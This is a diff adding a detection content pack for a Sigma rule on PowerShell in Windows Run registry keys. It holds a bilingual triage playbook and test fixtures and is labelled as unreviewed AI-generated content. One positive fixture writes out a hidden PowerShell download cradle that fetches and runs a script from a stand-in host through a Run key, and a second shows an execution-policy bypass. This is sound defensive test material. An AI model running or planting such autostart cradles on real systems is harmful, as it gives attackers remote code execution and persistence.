@@ -1,0 +1,136 @@
+{
+  "rule": {
+    "id": "8d85cf08-bf97-4260-ba49-986a2a65129c",
+    "title": "Suspicious PowerShell In Registry Run Keys",
+    "level": "medium",
+    "status": "test",
+    "author": "frack113, Florian Roth (Nextron Systems)",
+    "path": "windows/registry/registry_set/registry_set_powershell_in_run_keys.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/registry/registry_set/registry_set_powershell_in_run_keys.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1547.001"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un proceso escribió un valor en una clave Run, RunOnce o Policies\\Explorer\\Run cuyo contenido incluye PowerShell o código con estilo PowerShell. El comando se ejecutará automáticamente en el próximo inicio de sesión o arranque.",
+      "what_it_detects": "Eventos de modificación de registro donde TargetObject está bajo una clave de autoinicio tipo Run (HKLM/HKCU, incluidas WOW6432Node y Policies\\Explorer\\Run) y Details contiene indicadores como powershell, pwsh, -nop, -w hidden, -encodedcommand, FromBase64String, IEX o descargas.",
+      "why_it_matters": "Las claves Run son un método común de persistencia (ATT&CK T1547.001, claves Run del registro / carpeta de inicio). PowerShell oculto o codificado en ellas suele cargar malware o reconectar con infraestructura del atacante en cada inicio de sesión.",
+      "triage_steps": [
+        "Lea el valor completo de Details: decodifique cualquier -EncodedCommand o FromBase64String y anote URLs, rutas de archivos y el nombre del valor en TargetObject.",
+        "Identifique el proceso que escribió el valor (Image, ProcessId) y el usuario. Revise sus procesos padre e hijos.",
+        "Verifique si la clave es HKLM (requiere privilegios de administrador) o HKCU/HKU (por usuario) para determinar alcance y privilegios.",
+        "Pivotee en el mismo host +/- 15 minutos: creación de procesos, conexiones de red, escritura de los scripts referenciados y otros cambios de autoinicio.",
+        "Consulte dominios, IPs o hashes de scripts referenciados en threat intelligence y en logs de proxy/DNS de toda la organización.",
+        "Compare con la línea base: ¿el valor lo despliega una GPO, SCCM/Intune o un agente conocido en otros equipos?",
+        "Revise alertas previas del mismo host y usuario, en especial de acceso inicial o robo de credenciales."
+      ],
+      "false_positives": [
+        "Scripts legítimos de administración o de inicio de sesión que lanzan PowerShell desde claves Run; documéntelos por nombre de valor y ruta.",
+        "Software de terceros o agentes de gestión que registran utilidades PowerShell al inicio.",
+        "Pruebas autorizadas con Atomic Red Team u otras herramientas de validación de detecciones."
+      ],
+      "response_steps": [
+        "Confirme si es malicioso decodificando el comando y validando el script o URL con el responsable del activo.",
+        "Si es malicioso, aísle el endpoint y bloquee los dominios, IPs y hashes referenciados.",
+        "Exporte el valor del registro como evidencia y luego elimínelo junto con los archivos del payload referenciado.",
+        "Busque el mismo nombre de valor o comando en otros equipos y restablezca las credenciales del usuario afectado si hay indicios de compromiso.",
+        "Reinstale o restaure el equipo si encuentra más persistencia; documente y ajuste exclusiones para valores confirmados como benignos."
+      ],
+      "severity_rationale": "Nivel medio porque PowerShell en claves Run es una señal fuerte de persistencia, pero también lo usan scripts legítimos de administración y proveedores que requieren revisión contra la línea base."
+    },
+    "en": {
+      "summary": "A process wrote a registry Run, RunOnce or Policies\\Explorer\\Run value whose data contains PowerShell or PowerShell-style code. The command will run automatically at the next logon or boot.",
+      "what_it_detects": "Registry set events where TargetObject is under a Run-type autostart key (HKLM/HKCU, including WOW6432Node and Policies\\Explorer\\Run) and Details contains PowerShell indicators such as powershell, pwsh, -nop, -w hidden, -encodedcommand, FromBase64String, IEX or download cradles.",
+      "why_it_matters": "Run keys are a common persistence method (ATT&CK T1547.001, Registry Run Keys / Startup Folder). Hidden or encoded PowerShell in them often loads malware or reconnects to attacker infrastructure every time a user logs on.",
+      "triage_steps": [
+        "Read the full Details value: decode any -EncodedCommand or FromBase64String content and note URLs, file paths and the value name in TargetObject.",
+        "Identify the writing process (Image, ProcessId) and the user. Check the parent and child processes of that process.",
+        "Check whether the key is HKLM (needs admin) or HKCU/HKU (per user), which tells you scope and privileges.",
+        "Pivot on the same host +/- 15 minutes: process creation, network connections, file writes of referenced scripts, and other autostart changes.",
+        "Look up any referenced domain, IP or script hash in threat intelligence and proxy/DNS logs across the fleet.",
+        "Compare with the baseline: is the value deployed by GPO, SCCM/Intune or a known vendor agent on other hosts?",
+        "Review earlier alerts for the same host and user, especially initial access or credential alerts."
+      ],
+      "false_positives": [
+        "Legitimate admin or logon scripts that launch PowerShell from Run keys; baseline them by value name and path.",
+        "Third-party software or management agents that register PowerShell helpers at startup.",
+        "Atomic Red Team or other authorized detection tests."
+      ],
+      "response_steps": [
+        "Confirm maliciousness by decoding the command and checking the referenced script or URL with the asset owner.",
+        "If malicious, isolate the endpoint and block the referenced domains, IPs and hashes.",
+        "Export the registry value as evidence, then remove it and the referenced payload files.",
+        "Hunt for the same value name or command on other hosts and reset credentials of the affected user if compromise is likely.",
+        "Reimage or restore if further persistence or tampering is found; document and tune exclusions for confirmed benign values."
+      ],
+      "severity_rationale": "Medium fits because PowerShell in Run keys is a strong persistence signal, but legitimate admin and vendor scripts also use it and need baseline review."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Hidden PowerShell download cradle written to the current user's Run key by a script host.",
+        "event": {
+          "EventID": 13,
+          "EventType": "SetValue",
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\wscript.exe",
+          "ProcessId": 6120,
+          "TargetObject": "HKU\\S-1-5-21-1111111111-2222222222-3333333333-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SysHelper",
+          "Details": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://update.example.com/a.ps1')\""
+        }
+      },
+      {
+        "description": "pwsh with execution policy bypass set in the HKLM Policies\\Explorer\\Run key.",
+        "event": {
+          "EventID": 13,
+          "EventType": "SetValue",
+          "Computer": "SRV-FS-02.andes.example.com",
+          "User": "ANDES\\adm-mrojas",
+          "Image": "C:\\Windows\\System32\\reg.exe",
+          "ProcessId": 4388,
+          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\Updater",
+          "Details": "pwsh -ExecutionPolicy Bypass -File C:\\Users\\Public\\u.ps1"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "OneDrive registering itself in the Run key without any PowerShell content in Details.",
+        "event": {
+          "EventID": 13,
+          "EventType": "SetValue",
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe",
+          "ProcessId": 5012,
+          "TargetObject": "HKU\\S-1-5-21-1111111111-2222222222-3333333333-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDrive",
+          "Details": "\"C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe\" /background"
+        }
+      },
+      {
+        "description": "PowerShell path written to a PowerShell configuration key that is not a Run autostart key.",
+        "event": {
+          "EventID": 13,
+          "EventType": "SetValue",
+          "Computer": "WS-0207.andes.example.com",
+          "User": "NT AUTHORITY\\SYSTEM",
+          "Image": "C:\\Windows\\System32\\msiexec.exe",
+          "ProcessId": 2876,
+          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell\\Path",
+          "Details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-25T21:59:49+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
